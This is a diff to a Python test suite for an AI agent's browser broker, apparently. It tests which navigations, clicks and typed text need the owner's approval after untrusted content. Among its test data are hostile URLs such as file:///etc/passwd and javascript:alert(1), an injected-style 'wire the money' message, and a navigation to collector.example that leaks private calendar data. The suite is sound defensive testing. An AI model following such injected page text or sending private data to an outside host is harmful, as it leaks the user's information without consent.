@@ -10,6 +10,7 @@ import tempfile
 import threading
 import time
 import unittest
+from types import SimpleNamespace
 
 from coderunner.audit import AuditLog
 from coderunner.browser import BrowserBroker, BrowserError
@@ -17,7 +18,7 @@ from coderunner.browser import launcher
 from coderunner.browser.broker import CONTAINS_JS, DESCRIBE_JS, parse_url, render_ax, sensitive
 from coderunner.browser.cdp import CDPError, CDPPipe
 from coderunner.config import Config
-from coderunner.policy import Policy
+from coderunner.policy import Policy, current_run
 from coderunner.store import Store
 
 
@@ -310,6 +311,9 @@ class BrokerTestCase(unittest.IsolatedAsyncioTestCase):
 
 
 class NavigationPolicyTests(BrokerTestCase):
+    """An owner who chose to approve every site (an "ask" rule)."""
+    rules = [{"kind": "browser.navigate", "target": "*", "decision": "ask"}]
+
     async def test_bad_urls_are_rejected_before_asking_or_launching(self):
         self.dns["router.example"] = ["192.168.1.1"]
         for url in ("file:///etc/passwd", "javascript:alert(1)", "chrome://settings", "data:text/html,hi",
@@ -438,11 +442,10 @@ class InteractionPolicyTests(BrokerTestCase):
         wheel = browser.sent("Input.dispatchMouseEvent")[-1]
         self.assertEqual((wheel["type"], wheel["deltaY"]), ("mouseWheel", 400))
 
-    async def test_tainted_interaction_ignores_standing_rules(self):
+    async def test_ordinary_clicks_after_untrusted_content_need_no_prompt(self):
         await self.load_shop()
-        result = await self.broker.click(1, tainted=True)
-        self.assertFalse(result["ok"])
-        self.assertEqual(self.kinds(), ["browser.interact"])
+        self.assertTrue((await self.broker.click(1, tainted=True))["ok"])
+        self.assertEqual(self.asked, [])
 
     async def test_screenshot_change_detection(self):
         browser, _ = await self.load_shop()
@@ -518,6 +521,7 @@ class ApprovalContentTests(BrokerTestCase):
 
     async def test_typed_text_is_shown_in_full(self):
         await self.load_shop()
+        self.config.set("policy.rules", [{"kind": "browser.interact", "target": "*", "decision": "ask"}])
         text = "dear owner " * 60 + "PS: wire the money"
         self.assertFalse((await self.broker.type(2, text, tainted=True))["ok"])
         approval = self.approvals[-1]
@@ -587,6 +591,7 @@ class ApprovalContentTests(BrokerTestCase):
 
     async def test_key_press_approval_is_bound_to_the_focus(self):
         browser, _ = await self.load_shop()
+        self.config.set("policy.rules", [{"kind": "browser.interact", "target": "*", "decision": "ask"}])
         browser.focused = 109
         self.answers["browser.interact"] = True
         self.while_asking = lambda: setattr(browser, "focused", 111)
@@ -594,6 +599,43 @@ class ApprovalContentTests(BrokerTestCase):
         self.assertFalse(result["ok"])
         self.assertIn("Focus changed", result["error"])
         self.assertEqual(browser.sent("Input.dispatchKeyEvent"), [])
+
+
+class DefaultPermissionTests(BrokerTestCase):
+    """Without owner rules: ordinary browsing runs, committing steps and leaks ask."""
+
+    async def test_browsing_runs_without_prompts(self):
+        browser, _ = await self.load_shop()
+        self.assertTrue((await self.broker.navigate("https://news.example/"))["ok"])
+        self.assertTrue((await self.broker.navigate("https://shop.example/"))["ok"])
+        browser.ax = SHOP_AX
+        await self.broker.snapshot()
+        self.assertTrue((await self.broker.click(1, tainted=True))["ok"])
+        self.assertTrue((await self.broker.type(2, "sourdough", tainted=True))["ok"])
+        self.assertEqual(self.asked, [])
+        self.assertFalse((await self.broker.click(4))["ok"])         # "Buy now"
+        self.assertEqual(self.kinds(), ["browser.sensitive"])
+
+    async def test_private_data_needs_approval_before_it_reaches_a_site(self):
+        browser, _ = await self.load_shop()
+        run = SimpleNamespace(content_tainted=True, private_sources={"calendar"}, shared=set())
+        token = current_run.set(run)
+        try:
+            self.assertTrue((await self.broker.click(1, tainted=True))["ok"])      # no data in a click
+            self.assertFalse((await self.broker.type(2, "Delhi", tainted=True))["ok"])
+            self.assertEqual(self.kinds(), ["data.share"])
+            self.assertIn('Type "Delhi"', self.asked[0][1])
+            self.assertEqual(browser.sent("Input.insertText"), [])
+            self.answers["data.share"] = True
+            self.assertTrue((await self.broker.type(2, "Delhi", tainted=True))["ok"])
+            self.assertTrue((await self.broker.type(2, "Mumbai", tainted=True))["ok"])   # once per site
+            self.assertEqual(self.kinds(), ["data.share", "data.share"])
+            self.answers["data.share"] = False
+            result = await self.broker.navigate("https://collector.example/?d=Delhi", tainted=True)
+            self.assertFalse(result["ok"])
+            self.assertEqual(self.approvals[-1].target, "collector.example")
+        finally:
+            current_run.reset(token)
 
 
 class NavigationGuardTests(BrokerTestCase):
@@ -610,14 +652,21 @@ class NavigationGuardTests(BrokerTestCase):
 
     async def test_navigation_approvals_carry_the_full_url(self):
         self.config.set("browser.allow", [])
+        self.config.set("policy.rules", [{"kind": "browser.navigate", "target": "*", "decision": "ask"}])
         await self.broker.navigate("https://shop.example/a?b=1")
         await self.broker.open("https://shop.example/c")
         self.assertEqual([a.detail["url"] for a in self.approvals],
                          ["https://shop.example/a?b=1", "https://shop.example/c"])
 
-    async def test_leaving_the_site_during_an_action_needs_navigate_permission(self):
+    async def test_leaving_the_site_during_an_action(self):
         browser, _ = await self.load_shop()
-        self.broker._busy["P1"] = True                 # as if a tainted click were in progress
+        # By default the page's own links may lead anywhere public: the model did not choose them.
+        self.broker._busy["P1"] = True
+        self.request(browser, "0", "https://elsewhere.example/")
+        await self.settle()
+        self.assertEqual(browser.sent("Fetch.failRequest"), [])
+        # An owner who approves every site: leaving it mid-action is refused, since nobody can be asked then.
+        self.config.set("policy.rules", [{"kind": "browser.navigate", "target": "*", "decision": "ask"}])
         self.request(browser, "1", "https://elsewhere.example/?q=secret")
         self.request(browser, "2", "https://shop.example/next")
         self.request(browser, "3", "https://www.shop.example/")
@@ -633,6 +682,7 @@ class NavigationGuardTests(BrokerTestCase):
 
     async def test_popups_follow_the_rules_of_the_action_that_opened_them(self):
         browser, _ = await self.load_shop()
+        self.config.set("policy.rules", [{"kind": "browser.navigate", "target": "*", "decision": "ask"}])
         self.broker._busy["P1"] = False
         for popup, url in (("P7", "https://shop.example/help"), ("P8", "https://elsewhere.example/"),
                            ("P9", "http://10.0.0.5/admin")):
